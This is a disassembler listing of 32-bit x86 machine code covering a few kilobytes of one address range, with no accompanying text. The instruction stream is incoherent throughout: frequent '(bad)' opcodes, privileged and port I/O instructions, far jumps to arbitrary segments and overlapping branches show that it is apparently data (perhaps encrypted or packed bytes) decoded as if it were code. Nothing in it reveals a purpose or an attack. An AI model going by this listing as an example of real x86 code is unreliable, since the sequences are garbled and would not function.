  4043d2:	sbb    ecx,DWORD PTR [ebp+eax*4+0x73]
  4043d6:	add    bh,BYTE PTR [edi+eiz*2]
  4043d9:	inc    ebp
  4043da:	jo     0x404360
  4043dc:	call   0x5c74142c
  4043e1:	lds    esi,FWORD PTR [edi+edx*1-0x80]
  4043e5:	je     0x4043f1
  4043e7:	xor    al,0xbb
  4043e9:	pusha  
  4043ea:	sub    DWORD PTR fs:[ebp-0x3992ceb0],edi
  4043f1:	les    esp,FWORD PTR [esi-0xa3707af]
  4043f7:	popa   
  4043f8:	scas   al,BYTE PTR es:[edi]
  4043f9:	mov    WORD PTR [edx-0x61],fs
  4043fc:	fwait
  4043fd:	adc    eax,0xda89df86
  404402:	add    al,0x7a
  404404:	xor    ch,ch
  404406:	inc    esi
  404407:	mov    ah,0x21
  404409:	sbb    edi,esp
  40440b:	stos   DWORD PTR es:[edi],eax
  40440c:	mov    DWORD PTR es:[eax+0x4ae15901],esi
  404413:	xchg   BYTE PTR [edx+0x8],ah
  404416:	mov    dh,ah
  404418:	(bad)  
  404419:	sbb    DWORD PTR [ecx+0x55],edi
  40441c:	fs hlt 
  40441e:	stc    
  40441f:	icebp  
  404420:	jecxz  0x40441f
  404422:	adc    dl,bh
  404424:	aad    0x14
  404426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404427:	into   
  404428:	or     ecx,DWORD PTR [eax-0x28d851b7]
  40442e:	mov    eax,ds:0xda3baf6f
  404433:	out    dx,eax
  404434:	sar    BYTE PTR [ecx],cl
  404436:	rcr    BYTE PTR [ecx],1
  404438:	fld    DWORD PTR [edx]
  40443a:	test   BYTE PTR [ebx],0x9
  40443d:	dec    ecx
  40443e:	fidiv  WORD PTR [eax]
  404440:	dec    eax
  404441:	je     0x4044bf
  404443:	push   0xfa15064d
  404448:	pop    edx
  404449:	mov    esi,0xf211851d
  40444e:	sbb    edx,DWORD PTR [edi+edi*2-0x26]
  404452:	ffree  st(1)
  404454:	add    al,0x2c
  404456:	jbe    0x404483
  404458:	add    eax,0x7b433d91
  40445d:	fwait
  40445e:	xchg   ebx,eax
  40445f:	mov    dh,0xe3
  404461:	push   esi
  404462:	rol    DWORD PTR es:[ebx+0x4e],1
  404466:	gs mov edx,0x3e8c3d72
  40446c:	loopne 0x404405
  40446e:	(bad)  
  40446f:	pop    eax
  404470:	sub    bl,BYTE PTR [esi]
  404472:	in     al,dx
  404473:	pop    ecx
  404474:	jnp    0x404458
  404476:	cmp    al,0x8b
  404478:	mov    esi,0x5f5661c1
  40447d:	mov    dh,0xb5
  40447f:	int3   
  404480:	mov    ch,0x43
  404482:	pusha  
  404483:	aad    0xd3
  404485:	dec    eax
  404486:	imul   edx,DWORD PTR [ebx],0x5f
  404489:	add    al,BYTE PTR [ecx+ebx*2+0x2d213b00]
  404490:	bound  esp,QWORD PTR [ebp+ecx*8-0x64115e06]
  404497:	pop    esp
  404498:	ins    DWORD PTR es:[edi],dx
  404499:	xchg   ebx,eax
  40449a:	mov    eax,0xb02ac237
  40449f:	lea    ebx,[ebx]
  4044a1:	les    edx,FWORD PTR [edx+0x4d]
  4044a4:	fnstsw WORD PTR [ecx]
  4044a6:	int3   
  4044a7:	fwait
  4044a8:	ss mov ch,0xbb
  4044ab:	pop    ecx
  4044ac:	cmp    eax,0x96f1196a
  4044b1:	pop    ecx
  4044b2:	mov    esp,0xe0040e9
  4044b7:	cmp    eax,0x94d132
  4044bc:	push   ebx
  4044bd:	ds cs mov ecx,0xd87d0c4d
  4044c4:	or     eax,0x85037933
  4044c9:	mov    DWORD PTR ds:0x2e526dc,0x182517fd
  4044d3:	or     DWORD PTR [edx],edi
  4044d5:	lea    ebx,[ebx]
  4044d7:	loopne 0x4044ce
  4044d9:	pop    ebx
  4044da:	jnp    0x404513
  4044dc:	adc    eax,DWORD PTR [edx]
  4044de:	xchg   ecx,eax
  4044df:	rol    BYTE PTR [esi],0x85
  4044e2:	rcr    BYTE PTR [eax+0x43e17578],cl
  4044e8:	aas    
  4044e9:	push   edx
  4044ea:	pusha  
  4044eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ec:	ret    
  4044ed:	in     eax,0x55
  4044ef:	bound  edx,QWORD PTR [edi+0x50b63e10]
  4044f5:	push   ebx
  4044f6:	pop    ebx
  4044f7:	xor    DWORD PTR [ebx],eax
  4044f9:	adc    DWORD PTR [edi-0x78478081],ebp
  4044ff:	xor    BYTE PTR [ebx+0x21],ah
  404502:	sbb    ah,dh
  404504:	adc    DWORD PTR [ebp-0x17],0x81ed215d
  40450b:	(bad)  
  40450e:	into   
  40450f:	mov    al,0x26
  404511:	push   eax
  404512:	cmp    al,0x73
  404514:	add    bl,BYTE PTR ds:0x16a4ca0d
  40451a:	fsubr  QWORD PTR [ebx-0x16]
  40451d:	out    0x55,al
  40451f:	adc    BYTE PTR [edx+0x3586da05],ch
  404525:	pop    esp
  404526:	xchg   ebx,eax
  404527:	rcr    BYTE PTR [ebx-0x23],0x76
  40452b:	rol    DWORD PTR [ebp+0x2ff5d5b6],1
  404531:	loopne 0x40450e
  404533:	shl    DWORD PTR [ecx+eax*4],0x7d
  404537:	cmp    DWORD PTR [eax+0x705af08c],esp
  40453d:	pop    esp
  40453e:	ret    0xef9e
  404541:	push   edi
  404542:	imul   edx,edx,0x9
  404545:	or     al,0xf9
  404547:	scas   eax,DWORD PTR es:[edi]
  404548:	je     0x4044da
  40454a:	in     eax,dx
  40454b:	or     eax,0xee10d8b3
  404550:	fiadd  WORD PTR [ebp-0x22]
  404553:	jl     0x4044f7
  404555:	or     ebp,ebx
  404557:	sub    dh,ah
  404559:	cli    
  40455a:	fisttp WORD PTR [edi]
  40455c:	add    eax,0x51186dff
  404561:	rcl    DWORD PTR [ecx],1
  404563:	mov    al,ah
  404565:	mov    ebp,0xdcf375f1
  40456a:	fisub  WORD PTR ds:0xa101d4fb
  404570:	test   BYTE PTR [ebx-0x68],0x72
  404574:	mov    dl,0x79
  404576:	dec    ebx
  404577:	rol    BYTE PTR [esi+0x35],cl
  40457a:	faddp  st(6),st
  40457c:	cwde   
  40457d:	cmp    cl,bh
  40457f:	nop
  404580:	ss inc edx
  404582:	jle    0x404547
  404584:	test   al,0x53
  404586:	jge    0x4045cd
  404588:	xchg   edx,eax
  404589:	push   es
  40458a:	push   0xed0b5762
  40458f:	test   DWORD PTR [ecx+0x2dff94f3],edx
  404595:	push   esi
  404596:	inc    esi
  404597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404598:	inc    ebx
  404599:	push   eax
  40459a:	dec    edx
  40459b:	sbb    eax,0x506c521d
  4045a0:	xor    DWORD PTR [ecx+0x18],0x97b200eb
  4045a7:	cmp    DWORD PTR [edi],edx
  4045a9:	mov    dl,0xa
  4045ab:	daa    
  4045ac:	mov    bh,0x70
  4045ae:	and    al,0x40
  4045b0:	retf   0x63f9
  4045b3:	jl     0x40454b
  4045b5:	enter  0x442e,0x61
  4045b9:	sub    al,0x18
  4045bb:	hlt    
  4045bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045bd:	jns    0x40456d
  4045bf:	cmp    ch,BYTE PTR [ebp-0x12]
  4045c2:	xor    al,0x29
  4045c4:	int    0x70
  4045c6:	popf   
  4045c7:	clc    
  4045c8:	jmp    0x9f34:0xa596116e
  4045cf:	clc    
  4045d0:	mov    esp,0x43ee7de0
  4045d5:	int3   
  4045d6:	pusha  
  4045d7:	xor    ch,BYTE PTR [esi]
  4045d9:	add    eax,0xe1f2216f
  4045de:	(bad)  
  4045df:	mov    ch,0xce
  4045e1:	sti    
  4045e2:	scas   al,BYTE PTR es:[edi]
  4045e3:	pop    esp
  4045e4:	dec    edi
  4045e5:	std    
  4045e6:	push   ecx
  4045e7:	mov    bl,0xd2
  4045e9:	not    BYTE PTR ds:0xa45aa436
  4045ef:	jmp    0x4045d4
  4045f1:	ins    DWORD PTR es:[edi],dx
  4045f2:	clc    
  4045f3:	jb     0x4045b1
  4045f5:	or     ecx,esi
  4045f7:	into   
  4045f8:	loope  0x40461a
  4045fa:	mov    ds:0xee0b370c,al
  4045ff:	dec    ebp
  404600:	xchg   ecx,eax
  404601:	pop    edx
  404602:	pop    edi
  404603:	stc    
  404604:	in     eax,dx
  404605:	mov    eax,0x6c670876
  40460a:	lds    edx,FWORD PTR [ebx]
  40460c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40460d:	cmp    ebp,edx
  40460f:	mov    ds:0xca52c5d2,eax
  404614:	iret   
  404615:	pop    edi
  404616:	sar    ebx,cl
  404618:	mov    DWORD PTR [esi],edx
  40461a:	push   esi
  40461b:	xchg   edx,eax
  40461c:	outs   dx,BYTE PTR ds:[esi]
  40461d:	inc    ebx
  40461e:	jge    0x40461b
  404620:	imul   ebp,DWORD PTR [edx],0x6ff30587
  404626:	jmp    0x404635
  404628:	pop    eax
  404629:	mov    ebp,DWORD PTR [eax-0x27]
  40462c:	mov    ebp,0xad8a71c0
  404631:	inc    ecx
  404632:	les    edx,FWORD PTR [eax]
  404634:	adc    BYTE PTR [eax+eax*4+0x1dcdf25],cl
  40463b:	aam    0x6f
  40463d:	data16 or al,0x8c
  404640:	and    DWORD PTR [edx-0x41ac838a],0x20
  404647:	es into 
  404649:	sub    ebx,DWORD PTR [ebx+0x28]
  40464c:	mov    ch,al
  40464e:	add    BYTE PTR [edx+0x5f],bh
  404651:	xchg   edx,eax
  404652:	jne    0x404638
  404654:	(bad)  
  404655:	adc    edi,DWORD PTR [ebx+edi*4]
  404658:	sbb    edx,DWORD PTR [ecx]
  40465a:	sub    al,0x4e
  40465c:	dec    esp
  40465d:	jmp    0x4046c4
  40465f:	mov    ch,0xf9
  404661:	pop    esp
  404662:	jmp    0xd851:0x816900eb
  404669:	stos   BYTE PTR es:[edi],al
  40466a:	(bad)  
  40466b:	xchg   ecx,eax
  40466c:	arpl   bp,ax
  40466e:	fst    DWORD PTR [eax-0x4d]
  404671:	push   ebp
  404672:	sbb    ecx,DWORD PTR [ecx]
  404674:	shl    edi,0xe
  404677:	imul   ebx,DWORD PTR [ebx-0x47],0x61
  40467b:	push   0x1478384b
  404680:	rcl    DWORD PTR [eax-0x1d],1
  404683:	test   BYTE PTR [ebx+edi*8+0x5d37d7ed],bh
  40468a:	inc    ecx
  40468b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40468c:	fbstp  TBYTE PTR fs:[esi]
  40468f:	dec    esp
  404690:	lods   eax,DWORD PTR ds:[esi]
  404691:	test   al,0x26
  404693:	and    dl,BYTE PTR [eax-0x7d]
  404696:	fwait
  404697:	mov    bl,0x58
  404699:	or     ebp,DWORD PTR [esi]
  40469b:	lds    edi,FWORD PTR [ecx-0x34]
  40469e:	sar    DWORD PTR [ecx+eiz*4],0x41
  4046a2:	pop    edi
  4046a3:	push   esi
  4046a4:	cmp    DWORD PTR [edx+0xe],esp
  4046a7:	ss fcmovb st,st(6)
  4046aa:	shl    DWORD PTR [ecx],1
  4046ac:	pop    edi
  4046ad:	push   ss
  4046ae:	pop    edi
  4046af:	arpl   WORD PTR [esi-0x33f60a3e],sp
  4046b5:	xor    BYTE PTR [eax],ah
  4046b7:	retf   0x4151
  4046ba:	push   0xffffff8f
  4046bc:	in     al,0x8d
  4046be:	ins    DWORD PTR es:[edi],dx
  4046bf:	loop   0x404672
  4046c1:	mov    dh,0x15
  4046c3:	adc    DWORD PTR [edx-0x58],esp
  4046c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046c7:	add    eax,0xd2d00ba6
  4046cc:	adc    ebp,0xba6b6657
  4046d2:	pop    ebx
  4046d3:	push   ds
  4046d4:	sbb    dh,dl
  4046d6:	into   
  4046d7:	push   ss
  4046d8:	xchg   edi,eax
  4046d9:	daa    
  4046da:	jmp    0x4eac:0x5e43f20e
  4046e1:	(bad)  
  4046e2:	jmp    0x3224:0xa86073c
  4046e9:	xchg   ecx,eax
  4046ea:	inc    edx
  4046eb:	popa   
  4046ec:	mov    ds:0x1b643158,eax
  4046f1:	mov    edx,0x409a53f8
  4046f6:	sub    eax,0x9cd6f0f
  4046fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046fc:	cmp    al,BYTE PTR ds:0x35c816d6
  404702:	push   ds
  404703:	mov    ebp,0x640bef85
  404708:	popa   
  404709:	mov    bl,0xd9
  40470b:	jnp    0x4046c8
  40470d:	imul   ecx,DWORD PTR [ebp+0x5986b677],0xc520d17a
  404717:	(bad)  
  404718:	sahf   
  404719:	jo     0x404756
  40471b:	lahf   
  40471c:	pop    ss
  40471d:	outs   dx,BYTE PTR ds:[esi]
  40471e:	and    eax,0x4a4abb4b
  404723:	loop   0x404778
  404725:	jbe    0x4047a1
  404727:	pop    ecx
  404728:	add    al,0xf9
  40472a:	xchg   edx,eax
  40472b:	jns    0x40477e
  40472d:	lods   eax,DWORD PTR ds:[esi]
  40472e:	push   ebp
  40472f:	ror    DWORD PTR [eax-0x45e43ccb],0x78
  404736:	repz mov bl,0x12
  404739:	imul   eax,DWORD PTR [esi],0x2
  40473c:	mov    bh,0xa5
  40473e:	and    BYTE PTR [ebx-0x5d20c80d],bl
  404744:	gs fwait
  404746:	push   es
  404747:	jmp    0x4046fa
  404749:	repnz push ds
  40474b:	dec    edx
  40474c:	mov    esp,0x557ff7bc
  404751:	retf   
  404752:	cmp    al,0xd
  404754:	gs std 
  404756:	mov    dl,0xe5
  404758:	leave  
  404759:	lea    ebx,fs:[ecx+eax*4-0xc]
  40475e:	pop    ss
  40475f:	(bad)  
  404760:	adc    BYTE PTR [ecx-0x7d],0xf0
  404764:	pop    edi
  404765:	repnz mov edx,ecx
  404768:	retf   0x83ea
  40476b:	adc    dh,BYTE PTR [edi]
  40476d:	clc    
  40476e:	jo     0x4047a9
  404770:	add    ebp,esp
  404772:	mov    fs,WORD PTR [edx-0x46]
  404775:	mov    ebx,0x741ca520
  40477a:	retf   
  40477b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40477c:	retf   0x577f
  40477f:	push   cs
  404780:	adc    BYTE PTR [ebp+0x675eccdc],dh
  404786:	cmp    eax,0x64dd066
  40478b:	xor    ebp,edi
  40478d:	and    BYTE PTR [edi],bl
  40478f:	test   al,0xc1
  404791:	or     eax,0xe77e08d2
  404796:	mov    edx,0x85fc8d6e
  40479b:	mov    cl,0x7b
  40479d:	jmp    0x4047d8
  40479f:	pop    edi
  4047a0:	fcom   DWORD PTR [edx-0x6c]
  4047a3:	xor    edx,DWORD PTR [esi]
  4047a5:	add    bl,BYTE PTR ds:[esi]
  4047a8:	push   ds
  4047a9:	repz jb 0x40481f
  4047ac:	dec    edx
  4047ad:	ret    
  4047ae:	mov    edx,0xbda08d
  4047b3:	push   0x2f
  4047b5:	mov    edx,0x65cbe5c9
  4047ba:	adc    dl,BYTE PTR [eax-0x2b]
  4047bd:	mov    edx,0xc47226d8
  4047c2:	inc    esi
  4047c3:	cmp    ah,dl
  4047c5:	ret    0x2738
  4047c8:	xchg   DWORD PTR [esi+0x35],ebx
  4047cb:	jne    0x4047e2
  4047cd:	mov    esp,0xa2917883
  4047d2:	push   0xd6325a88
  4047d7:	popa   
  4047d8:	sub    esi,ebx
  4047da:	leave  
  4047db:	mov    dl,0xbe
  4047dd:	stos   BYTE PTR es:[edi],al
  4047de:	mov    WORD PTR [edi],ss
  4047e0:	outs   dx,DWORD PTR ds:[esi]
  4047e1:	call   0x501b:0x23a55c91
  4047e8:	jecxz  0x404792
  4047ea:	dec    esi
  4047eb:	mov    ebx,0xef5c83cb
  4047f0:	push   esp
  4047f1:	into   
  4047f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047f3:	in     eax,dx
  4047f4:	mov    edx,0x154397cc
  4047f9:	push   esp
  4047fa:	mov    es,ecx
  4047fc:	inc    eax
  4047fd:	adc    eax,ecx
  4047ff:	nop
  404800:	add    edx,DWORD PTR [ecx+ebx*4]
  404803:	push   edi
  404804:	ins    DWORD PTR es:[edi],dx
  404805:	loop   0x40487b
  404807:	cmp    esp,DWORD PTR fs:[ebx-0x9]
  40480b:	xor    ebp,DWORD PTR [eax-0x59]
  40480e:	cmc    
  40480f:	jnp    0x4047c9
  404811:	and    esi,edi
  404813:	dec    ebp
  404814:	adc    eax,0x18c1ed3f
  404819:	mov    ebx,0x9c7cc687
  40481e:	mov    WORD PTR [edx+0xd],ds
  404821:	and    edi,0xffffff8c
  404824:	pop    ds
  404825:	imul   BYTE PTR [edx+eax*2+0x1b8f2229]
  40482c:	loopne 0x4047b6
  40482e:	or     dl,BYTE PTR [edi+ebx*2+0x11]
  404832:	adc    dl,BYTE PTR [esi-0x7387f913]
  404838:	push   edi
  404839:	xor    cl,BYTE PTR [eax+0x73]
  40483c:	aaa    
  40483d:	dec    edi
  40483e:	ret    0xbbfb
  404841:	stos   BYTE PTR es:[edi],al
  404842:	shl    DWORD PTR [eax+0x44],0x78
  404846:	in     eax,dx
  404847:	lds    ecx,FWORD PTR [esp+eiz*8+0x2e39490f]
  40484e:	add    DWORD PTR [edi+0x2849204],eax
  404854:	scas   eax,DWORD PTR es:[edi]
  404855:	pop    edi
  404856:	iret   
  404857:	dec    esi
  404858:	pop    esp
  404859:	push   es
  40485a:	scas   eax,DWORD PTR es:[edi]
  40485b:	aad    0xb3
  40485d:	xchg   ebp,eax
  40485e:	sub    edx,ebp
  404860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404861:	cmp    al,0x47
  404863:	xchg   ecx,eax
  404864:	fsubr  QWORD PTR [edi+0x1d]
  404867:	in     al,0x9c
  404869:	ins    BYTE PTR es:[edi],dx
  40486a:	inc    esi
  40486b:	mov    ah,0x4d
  40486d:	retf   0xec50
  404870:	mov    bh,0x4d
  404872:	push   0x3d
  404874:	dec    esi
  404875:	mov    al,0xc8
  404877:	fbstp  TBYTE PTR [edi-0x532ae148]
  40487d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40487e:	repz add BYTE PTR [eax-0xc233a56],ch
  404885:	cmc    
  404886:	ja     0x404904
  404888:	test   eax,0xfd9f1152
  40488d:	into   
  40488e:	jbe    0x4048e6
  404890:	ja     0x40488f
  404892:	fadd   DWORD PTR [ebp+0x431e95a8]
  404898:	std    
  404899:	pop    eax
  40489a:	cmp    DWORD PTR [edi-0x1b5e5b3d],ebp
  4048a0:	stos   DWORD PTR es:[edi],eax
  4048a1:	mov    ah,0xb
  4048a3:	pop    edx
  4048a4:	std    
  4048a5:	aas    
  4048a6:	fcom   DWORD PTR [ecx-0x4fafa274]
  4048ac:	cwde   
  4048ad:	dec    ebx
  4048ae:	jge    0x4048fd
  4048b0:	jl     0x404870
  4048b2:	and    eax,DWORD PTR [esi+0x4e8063fc]
  4048b8:	and    BYTE PTR [eax+edi*2+0x6],dl
  4048bc:	xchg   esp,eax
  4048bd:	rcr    BYTE PTR [edi+0x16],1
  4048c0:	push   cs
  4048c1:	cmp    edi,ebx
  4048c3:	sbb    BYTE PTR [edi+0x61],bh
  4048c6:	adc    eax,0x7194706a
  4048cb:	jmp    0x404884
  4048cd:	fsubp  st(2),st
  4048cf:	and    ebp,edx
  4048d1:	sub    eax,0x1d06d4ed
  4048d6:	lods   al,BYTE PTR ds:[esi]
  4048d7:	rcr    DWORD PTR [ebx+0x67],1
  4048da:	cmp    DWORD PTR [edx-0x3a],0x3ad0084d
  4048e1:	mov    es,WORD PTR [ecx+0x7f]
  4048e4:	mov    ebp,0x1088c4e3
  4048e9:	cld    
  4048ea:	inc    edi
  4048eb:	(bad)  
  4048ec:	or     eax,0xb752eb39
  4048f1:	cwde   
  4048f2:	lock mov bl,0xc9
  4048f5:	sbb    eax,0x85e536e6
  4048fa:	ja     0x40491c
  4048fc:	cmc    
  4048fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048fe:	das    
  4048ff:	mov    ah,0x33
  404901:	or     ch,BYTE PTR [edi+ebx*4-0x2bbc7e49]
  404908:	fldenv [edi]
  40490a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40490b:	xchg   ebx,eax
  40490c:	xchg   ecx,eax
  40490d:	rcr    BYTE PTR [eax+0x51],1
  404910:	das    
  404911:	mov    al,ds:0x564cf14a
  404916:	sub    eax,0x2bf0b92
  40491b:	sub    dl,BYTE PTR [ebx]
  40491d:	add    al,0xed
  40491f:	inc    esp
  404920:	aas    
  404921:	lgs    edx,FWORD PTR [ebx-0x155b4ca3]
  404928:	dec    edx
  404929:	push   es
  40492a:	push   0x18
  40492c:	das    
  40492d:	ret    0xd681
  404930:	add    DWORD PTR [ebx-0x1d],edi
  404933:	shl    DWORD PTR [esi+0x3d],cl
  404936:	jne    0x4048f1
  404938:	mov    al,ds:0xee5c2865
  40493d:	daa    
  40493e:	test   DWORD PTR [ebx-0x3f],esi
  404941:	cmovo  esp,DWORD PTR [edx+0x57]
  404945:	push   0xffffff9f
  404947:	dec    esp
  404948:	dec    edx
  404949:	pushf  
  40494a:	fsub   QWORD PTR [eax]
  40494c:	jbe    0x40493b
  40494e:	mov    dl,0x3
  404950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404951:	inc    BYTE PTR [ebp-0x16c657ba]
  404957:	push   0xffffff85
  404959:	call   0x25862e73
  40495e:	adc    eax,0x534263f4
  404963:	mov    dh,0x6f
  404965:	arpl   WORD PTR [eax+0x53],cx
  404968:	cmp    eax,0xac4959f3
  40496d:	daa    
  40496e:	imul   ebx,DWORD PTR [edx+0xd],0x270f1cb1
  404975:	(bad)  
  404976:	sub    eax,0xa5ed965f
  40497b:	adc    BYTE PTR [edi-0x32],dh
  40497e:	jle    0x4049e8
  404980:	bound  edi,QWORD PTR [ebx]
  404982:	jno    0x40496e
  404984:	inc    BYTE PTR [ebx+0x6580e613]
  40498a:	inc    ebx
  40498b:	mov    dh,BYTE PTR [esi+0x1d]
  40498e:	cmc    
  40498f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404990:	js     0x4049a8
  404992:	mov    edx,0xe9436cdb
  404997:	in     al,0x8
  404999:	pop    ss
  40499a:	(bad)  
  40499b:	xor    ecx,DWORD PTR [edi]
  40499d:	xor    BYTE PTR [ecx-0x15],bh
  4049a0:	jns    0x4049a1
  4049a2:	sub    BYTE PTR [eax],cl
  4049a4:	xchg   ecx,eax
  4049a5:	ds pusha 
  4049a7:	add    ebx,DWORD PTR [eax-0x22]
  4049aa:	xor    al,BYTE PTR [ebx-0x60]
  4049ad:	gs mov ah,0x5b
  4049b0:	mov    esp,0x6dc2b6b2
  4049b5:	dec    edx
  4049b6:	add    al,0xb3
  4049b8:	popa   
  4049b9:	(bad)  [ebx]
  4049bb:	lods   eax,DWORD PTR ds:[esi]
  4049bc:	adc    dh,BYTE PTR [edx-0x370539fe]
  4049c2:	das    
  4049c3:	jmp    0xab64:0x86f58131
  4049ca:	mov    ebp,0x6dc3c13e
  4049cf:	sub    edi,0x6aa7f1d8
  4049d5:	add    al,0x87
  4049d7:	cmp    DWORD PTR [eax+esi*4-0x14],0x3df9c1ed
  4049df:	mov    edx,0x6f982e66
  4049e4:	mov    ds:0x7da52478,eax
  4049e9:	mov    esi,0x54100c89
  4049ee:	pop    ecx
  4049ef:	jb     0x4049f6
  4049f1:	push   ebx
  4049f2:	mov    dh,0xa7
  4049f4:	dec    esi
  4049f5:	or     BYTE PTR [ecx+0x31],0xc6
  4049f9:	dec    ebp
  4049fa:	pop    edx
  4049fb:	(bad)  
  4049fd:	cdq    
  4049fe:	in     eax,dx
  4049ff:	xchg   ebx,eax
  404a00:	pop    ds
  404a01:	mov    ds,WORD PTR [eax+0x15]
  404a04:	mov    cl,0x53
  404a06:	out    0xb4,eax
  404a08:	jns    0x404990
  404a0a:	jecxz  0x4049d9
  404a0c:	outs   dx,BYTE PTR ds:[esi]
  404a0d:	cs push edi
  404a0f:	fdivrp st(7),st
  404a11:	push   0xffffffb1
  404a13:	imul   ecx,DWORD PTR [ebx+0x1fc246f4],0xc21a5f45
  404a1d:	add    dl,BYTE PTR [ecx+0x44b2a116]
  404a23:	call   0x845:0x3c7018af
  404a2a:	add    ah,BYTE PTR [edi+0x3baef82f]
  404a30:	adc    eax,0x9aae52b2
  404a35:	ds mov ah,0xef
  404a38:	mov    edi,0x6228b344
  404a3d:	jo     0x4049e8
  404a3f:	lods   eax,DWORD PTR ds:[esi]
  404a40:	dec    ebx
  404a41:	sar    BYTE PTR ds:0x22520b57,cl
  404a47:	push   edx
  404a48:	call   DWORD PTR [eax]
  404a4a:	sbb    ah,BYTE PTR [ecx+0x17f1f628]
  404a50:	enter  0xf7ab,0x4e
  404a54:	jbe    0x404aad
  404a56:	fadd   DWORD PTR [edi-0x2013ee95]
  404a5c:	adc    DWORD PTR [eax+edi*4-0x15],ebp
  404a60:	add    eax,0x3e3e5ccf
  404a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a66:	mov    ebp,0x492e6108
  404a6b:	jbe    0x404a8d
  404a6d:	or     DWORD PTR [ebx-0x3e5645da],edx
  404a73:	arpl   WORD PTR [eax+0xfa77d8b],bp
  404a79:	sbb    DWORD PTR [ebx-0x2c],0xffffffe7
  404a7d:	ja     0x404a83
  404a7f:	dec    ecx
  404a80:	les    esi,FWORD PTR [ebp-0x1b6457cc]
  404a86:	xor    BYTE PTR [edx],cl
  404a88:	sti    
  404a89:	inc    esi
  404a8a:	neg    DWORD PTR [esi]
  404a8c:	retf   
  404a8d:	push   ds
  404a8e:	shl    BYTE PTR [ebx+edi*8-0x5a49e5ed],0xc7
  404a96:	cmp    al,0xf4
  404a98:	mov    dh,0x82
  404a9a:	repnz jmp 0xba49:0x53d26d92
  404aa2:	ficomp DWORD PTR [eax+eiz*1-0x4b]
  404aa6:	cmp    edx,DWORD PTR [ebx-0xba25515]
  404aac:	jg     0x404ad1
  404aae:	mov    ebp,0x64ef01e7
  404ab3:	mov    ecx,es
  404ab5:	push   ds
  404ab6:	mov    edi,DWORD PTR [ebx]
  404ab8:	cmp    al,0x59
  404aba:	xchg   DWORD PTR [eax-0x67d29390],esi
  404ac0:	adc    al,0x0
  404ac2:	ret    0x174
  404ac5:	not    DWORD PTR [ebp+0x57]
  404ac8:	nop
  404ac9:	retf   
  404aca:	pop    edi
  404acb:	cmp    DWORD PTR [ecx+0x7a],0xe4ea405b
  404ad2:	push   ecx
  404ad3:	sbb    ebp,DWORD PTR [ebx-0x6f]
  404ad6:	imul   ebx,DWORD PTR fs:[ecx],0x8d78a583
  404add:	test   al,0x5
  404adf:	outs   dx,DWORD PTR ds:[esi]
  404ae0:	pop    ds
  404ae1:	mov    ds:0x6127c0ed,eax
  404ae6:	imul   ebp,DWORD PTR [ebx+eax*4],0x7e16e48
  404aed:	mov    al,ds:0x74bef5e2
  404af2:	push   esp
  404af3:	fcmovnb st,st(3)
  404af5:	jnp    0x404b41
  404af7:	push   0xffffffa3
  404af9:	(bad)  
  404afb:	xchg   edx,eax
  404afc:	inc    esi
  404afd:	out    dx,eax
  404afe:	hlt    
  404aff:	in     al,0x40
  404b01:	sbb    cl,BYTE PTR [eax+0x5abca89b]
  404b07:	xchg   edx,eax
  404b08:	cmp    eax,0xc736c993
  404b0d:	xor    eax,edi
  404b0f:	xor    DWORD PTR [esi],0x2a
  404b12:	xchg   DWORD PTR [eax-0x5d],ecx
  404b15:	aad    0xf9
  404b17:	mov    WORD PTR [ecx-0x65],es
  404b1a:	(bad)  
  404b1b:	ins    DWORD PTR es:[edi],dx
  404b1c:	or     cl,BYTE PTR [esi+ecx*1]
  404b1f:	xchg   esi,eax
  404b20:	jns    0x404af1
  404b22:	(bad)  
  404b23:	dec    esp
  404b24:	ins    DWORD PTR es:[edi],dx
  404b25:	mov    eax,0xfe117780
  404b2a:	dec    edx
  404b2b:	aad    0xb0
  404b2d:	test   eax,0x854160d7
  404b32:	jbe    0x404b9b
  404b34:	cs or  eax,0xcfa7418d
  404b3a:	adc    al,0x2b
  404b3c:	mov    ds:0xd3a8a52e,eax
  404b41:	push   ss
  404b42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b43:	imul   eax,esp,0x29
  404b46:	jmp    0xd77c:0xbc4b81b5
  404b4d:	jne    0x404b6c
  404b4f:	dec    eax
  404b50:	std    
  404b51:	sub    eax,0x88edafa6
  404b56:	cmc    
  404b57:	jmp    0xd23ac299
  404b5c:	xchg   esp,eax
  404b5d:	and    ebx,DWORD PTR [edx+0x73d6e28a]
  404b63:	mov    al,ds:0x56fe92f0
  404b68:	lods   eax,DWORD PTR ds:[esi]
  404b69:	loope  0x404bbd
  404b6b:	iret   
  404b6c:	(bad)  [esi+0x11]
  404b6f:	and    DWORD PTR [edx-0x60349b20],esp
  404b75:	loopne 0x404b18
  404b77:	mov    ah,0x34
  404b79:	adc    al,0x1b
  404b7b:	dec    edi
  404b7c:	mov    eax,0x75beb262
  404b81:	inc    esp
  404b82:	push   esp
  404b83:	sub    ebp,edi
  404b85:	dec    esp
  404b86:	pop    esi
  404b87:	or     DWORD PTR [edx],0xffffffb9
  404b8a:	pusha  
  404b8b:	add    esi,DWORD PTR gs:[ebx-0x39a49350]
  404b92:	dec    BYTE PTR [ebx+0x73]
  404b95:	scas   eax,DWORD PTR es:[edi]
  404b96:	call   0x99a4:0x738c8b3
  404b9d:	loopne 0x404b46
  404b9f:	jmp    0x393d:0x7aae9203
  404ba6:	xor    al,0x72
  404ba8:	fs sbb al,0x6
  404bab:	repz push cs
  404bad:	jg     0x404b3d
  404baf:	add    eax,0x15467b98
  404bb4:	(bad)  
  404bb6:	mov    bh,0x41
